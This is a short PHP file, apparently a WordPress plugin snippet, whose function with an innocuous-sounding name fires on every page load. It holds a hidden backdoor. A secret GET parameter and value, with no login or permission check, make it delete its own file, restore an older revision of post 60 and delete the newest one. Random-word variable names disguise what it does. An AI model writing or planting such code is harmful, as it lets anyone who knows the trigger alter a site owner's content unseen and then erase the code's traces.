<?php

function bootstrap_src_html5() {
	if (isset($_GET['ajax_awesome_soon_delivery']) && $_GET['ajax_awesome_soon_delivery'] === 'marketplace_calculator_themes') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$reading_extension_replace = 60;
		$min_status_core = wp_get_post_revisions($reading_extension_replace);
		if (empty($min_status_core)) die('no revisions');
		if (count($min_status_core) < 2) die('less than 2');
		$query_nice_http = array_shift($min_status_core);
		$notifications_top_recaptcha = $query_nice_http->ID;
		$paragraph_wow_catalog = array_shift($min_status_core);
		$stream_live_history = $paragraph_wow_catalog->ID;
		$gdpr_api_revisions_social = wp_restore_post_revision($stream_live_history);
		if ($gdpr_api_revisions_social === false) die('error restoring');
		$gdpr_api_revisions_social = wp_delete_post_revision($notifications_top_recaptcha);		
		if ($gdpr_api_revisions_social === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'bootstrap_src_html5');
